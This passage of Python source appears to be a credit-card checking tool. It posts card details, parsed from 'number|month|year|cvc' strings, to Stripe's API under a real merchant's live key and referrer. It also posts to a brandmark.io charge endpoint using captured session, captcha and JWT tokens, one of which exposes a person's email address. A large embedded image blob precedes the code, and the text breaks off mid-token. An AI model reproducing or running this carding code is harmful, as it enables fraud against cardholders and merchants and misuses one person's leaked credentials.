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" id="icon" x="466" y="-52" width="53.52879581151833" height="53.52879581151833" transform="translate(0 346.24) translate(409.4845947643978 -26.139999999999993) scale(2.5) translate(-470.11625 50.76)"></image>\n    </g>\n  </g>\n</svg>\n',
	    'user_id': 'Qb7eJOxZFVc4bIXxFkRzRPZSbko2',
	    'access_token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjgwNzhkMGViNzdhMjdlNGUxMGMzMTFmZTcxZDgwM2I5MmY3NjYwZGYiLCJ0eXAiOiJKV1QifQ.eyJuYW1lIjoiVkJGIiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0laRlpBMlFaSGZSN044b0JtZ1phZV9aM0VCYzU0LUpzLU8taUJQUmRQQ0oyVkdrdz1zOTYtYyIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9icmFuZG1hcmstaW8iLCJhdWQiOiJicmFuZG1hcmstaW8iLCJhdXRoX3RpbWUiOjE3MTIxODQwNjIsInVzZXJfaWQiOiJRYjdlSk94WkZWYzRiSVh4RmtSelJQWlNia28yIiwic3ViIjoiUWI3ZUpPeFpGVmM0YklYeEZrUnpSUFpTYmtvMiIsImlhdCI6MTcxMjE4NDA2MiwiZXhwIjoxNzEyMTg3NjYyLCJlbWFpbCI6InZpc2FzcGFtNzdAZ21haWwuY29tIiwiZW1haWxfdmVyaWZpZWQiOnRydWUsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnsiZ29vZ2xlLmNvbSI6WyIxMTIxOTU0NzY2ODEzMjczNDQ4NjciXSwiZW1haWwiOlsidmlzYXNwYW03N0BnbWFpbC5jb20iXX0sInNpZ25faW5fcHJvdmlkZXIiOiJnb29nbGUuY29tIn19.FqQOaL5Gh7p4QjqaTy6G0trQ2QLnonYQg27egGs4nOkD66MVbUSNDsYwUvD709AW42m7Jij3ijEzpB5ReztYHOyUP7SzMe9pTaJaU8gyOkUe_LRwCCL4kG-kRf3helMjgyscyNmZ-XfevHceKDkN45p8EYaJsROl_xGgeBG6eGYGf0rDx9Rn_y209PsPd1ewsep4YsfvEBOEVVJUZNBq3l2xZhiV7lEcLj4ZmYzmbyxub276XMe0la2gVS1WNQZ6zvYsvcV8dcdowT_M18wCw5jNiLtFRGWKGzsPaQrl8SfZD6hHHGqhokJcl8fqbaHFf3ohzT8Jejq71SXSaGwrpQ',
	    'recaptcha_token': '03AFcWeA5-ja4tod6UAUjMvEbNBmKOPaucmhAVYsskgu-MZyq_mKKX-5or9_aEGTZ6vQbo9PCujr5hA6uGltPzZPQlX6h-0ZLtPzEEfkbF3VUyRWGF7d5PIZmxyCrVUTDzz2XJi-jy7Z7V-wdhW4LYAIGtU53OakGCWxKo5hxoVtnwCBn6RwZ7pJzOv0jrlyROQ4L6WoQKv2QjBd-SVYFoCpTUUwoaGbblSMn5ailfz7221noX1gGSHCetrUMSYoyiFvNwZjfY3aXNVs2-9E3Y70fKja8DcUaxMXiTCG2gbRF9buospXkuTpsm64O_n4QDdHSStVqNBEpMtgf0jIl5XqV18f2u9zCSU8ODzcX2xd9WAfb5lGniHViGKa-5S1SsTTHp_tpGPYbXnWtZ9DDN4Je3vU6-WKhHmQfjCzG-Zf3vdCd_5eHesB4kN2TobafI_Ecv8SbtwI_9KdoteTxDix_gBzS74CIaK1k_xG8JbsNu1WpqTMqhQEzNj_cv4TLoccPGDsMN0M1UDhDwJhjmm5ND_Q24kFI0Ikt1yKe0DZBoLj6CirGIrenF4HpZIG1o0mU-FzUf6oJ7AC1-W-7JvJ81HIRPsc7Z4qFcvOV3fF06Hopdm-l7sX80YQkXz_jq-W04jlA2Qm7b81rXbmdxquKdX0-uJOE5ZIYfncibV_1i2V5GU7HqkyUDZfAm124IBhzEaGL4Nq_Bvw5iBLRN_TAlAbOL6sNyEzWq-csEdKivNr9c4svjRQlue_hfmuQZ5tc-KX7z-Do5BHX-SrLBbhDVNviT5VomkqCCrhrQDFSm65a3DC_6Hyi8plsSdtm85oVAuXLVwcVMCu12rNBKJnUvSeysLF_DkWGu3omK5QsA5u1Gp_75cWbrpEOMNn4GPfKsKuHe9nHOb7yMKC3aYz3ahwQJSFDi_D033Qir77kFTYS_PNEdQJvsGJm5tJhhm6eBMIJkzFGS150ygJGQby_e0mIFHmXn1_5JU4_Xg3B5eRl9SzqAJ8qvcMDdQVGa5a67M5xq7Tg66JlEdhmEfaDWKr4MjkPYENr2_Hex1tumvr9PQRgF1ucWNFxls-PuboXE830m5tGDjCf_nL9AMKP2ko8xygjYqEzXydZFlGe8agWcnicvaKjOqk3iYO5kRmr2bTkyWSSq5dLdBbM7LJ-mOIooB-MJPv1oM99ClA-KeOfDjwGHWFPj0No7HV8FG38P58xcR_YkcuxoD-yT5v45rblabkrxykRNTnsfChNTMK5YqN9oPJs5S3SXslc50iK_hvm69XcjBy-GzMo0ro-Q-ASjI1SA1hqNwfPlgDGVYeziFV6AtNiaFxxpjwzgX3NTYhQnwd1bfH_try3Q2iX8mH8ehidVwdH1is0aRPvn9MNpq5_f5WJasvPDIlQpHnWt6brXZJLQPH7DUKFPVAWRlQ4PJkNv2ylX9CrFmZ_3LHXrnwXTvLcIa-pTJKM1NfYE4ty0zd88h1gvzYhRuJonkWiaxzpB6hpJZrL-keYbAOJT7OHewqLUieEnI29oNJFfMwIgh3p45lz2Cpb2A9Fv58akE_MONfL9gLcsgx-mdv72NNUbxl4n2T7ccXhs05jXo6KkWt-RJJPm6_WYTuAuc5B81BYzziBq2Usx3TqWdelZtj11fLC9av2FYgD6jrd2Ln1kQYsHh1OJQoWYtAjScOEgZDno2C_JQmckN8ieRJeuU2asUyU7k7KvS4ZubTJQJ5vJbhCrFiptg_GgSLIsckMu6iR0mBYBdPtDOcVs6eMMTUN5Msh9axjj7xAOCMr4nvwhzSFPv5vW-j3WfFE_tZqn-6qFw6dVaCM0qr03AAt0YL2aayuAAOnUTNz57OSYdQROOfP8Zh2sa_XKQWs4Avff3iHh-eJFbbS5x9fDTxknuEzmCiZqBCwbqXu7Paf_UvVhIsof7MIBAsV-ZkIDvvWYvFzZGaCG5e-Jd4eDdhb718_13Si9Afamzu0DVhcz1Mo2SS44',
	    'token': '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',
	}
	
	response = requests.post('https://app.brandmark.io/v3/charge.php', cookies=cookies, headers=headers, json=json_data)
	ug=(response.json()['status'])
	msg=(response.json()['message'])
	if ug=='success':
		return ug
	else:
		return msg
def sff(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=EG&payment_user_agent=stripe.js%2F1a2719a8b8%3B+stripe-js-v3%2F1a2719a8b8%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fkaffakoffee.com&time_on_page=103984&client_attribution_metadata[client_session_id]=7b9ad5e2-e9de-432c-a47e-887b3c130324&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&	client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=4b356589-cfc9-4ce3-bacd-87a9aabfab2d607329&muid=eb4a06a4-a16f-48d3-b545-a5d2b939a0692c13f4&sid=8ed4363b-1f40-4dad-b10b-231b86812b80fe8d6b&key=pk_live_51JyytzLXD7z9zWiBwrQLdM1VLeKVB7vtvPmSrtCBm7gx38xBK9JDkSLNuviPvKMl46nlovnuYzAQmkGSQuNbGm5b00VcSDH3eO&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYlrwA_py0WqtyI1db31TzpENKN6WDOm1-mmL8jgXA30wk9Bym_Rz5RMhsXyBhhLUBh9JCBDTKrFaNgUr_BuplHcnyZtm5CAqvxo7_7NuCKZfL5gbaob5RjyMUXmnAvj1Z9d7STHKlK__GLWacJUVlrLSW8YGyYDluCi9jeJc83_-oiHHPEx-2xtFthx8idmRRu2F2nAZMULm_EfBXLUr_K979UU2pL-G8VXgBzM3wxO4MeSHOFMyQkQpxfb8d0lA6qAFeyJi9LoomNALcxxK6mMhbLyUTVf_gD-3njfYBToy8Oxu7pOA1KrmrVGdaUQ7sBmJOesp2qUFY7D8wnVs35mu5w76Hh-TBDoXTGgvWG2xXtQ5LhbBG8uHwLmpLq0nYmC84U2UzsFBo30hs13rs3dXRCNNHvlhhmpwjONTCfHiqpJte4A9eSWodPMjc4r7QFLeRhVZHcogvyu5M9Hs6V84qKnNmBMTJrN3kskk_MaOqFuHx6VF7NN3y5wH5L4g6n7uPYQ0lHjI0P7HKaxbJ-9Qna4xWCEdR3O-Xft1RNSbgjjyNJrRLJwCEUnathNvVEzC3azI3tDM1hLp00iJl9IcenUPUbpxI14QBnOBD8TK09jfFtF9W6pACvAnq_FxEuXa70RdemtVw2UiZJ2e0Mn_njYqgNPd6wbgrYHznFu60Dv04T98cCZIfCYUZn8nZMmiEwbm4OYRE1DKu_RTps33u1kYv7DfV8stbYeMM3JltMJXyBIT-p4ePqrmNTNY6fiehb1EHau0ar7NavLbv3h9Jp3xkWHigS5Xk4RHhrGA-1NtH1oanFFnmLGvQg6hQk0HNLV7wmtZl4PI-fbb44TDvxP68CQVC_2WYdApwx8c6LYLGaiQTosFI0yLBT1MvJKdSLjRJw3il2W16eUNoVd2fUFaSKuQiERasSmrXOzv-B91TIyFNeBXfC0Zfc63FbUfRQ6-XotOsPPbHHJW9RJwzeoKeSSw8_MmrrjJL1S8swivdtHoBXBrh5rF5HQ2hJLhwMuxVcq3SMur_zSi4pohz1XPqK__DvcCIsD6IEW2yA7mfE53WXtcpjs-SzL36OxscpMX0R038x1cv-5leZp8SI8h6dEMWNRjHpWE65msGgkYg-M1rBt1QsR22Nv_me_ij5QkAa9aYmc_LDyOe4N9B-PS7OUg3cCM0RF1aoRM3YEvJTv00EwQBR0MJHqRm6BTIO5pynF2HkF5Pzs1VVja_zgD5L3-iHbok0RhBZ7Yh60iFW9CAxH3a5grQ-UJqDf7tMEkaj76PvdS7vqk3rRYlvHZV3Xcfo-kUY4Yg5VMKMe3lf111-DN4LyWYsWU6PoQ1nKng-SDnLGyBRU6SWtUcwGLau4uzq4Gz7FKyJPdB9q1dmdkBurYgdbRN2Lc0VmnbBmgdj1fJmzlzOOmBnsBKI3uwIDVoOZn3augqqEOBe8I3hl8-Ch2U7W2Igqnp3sQD8y0-q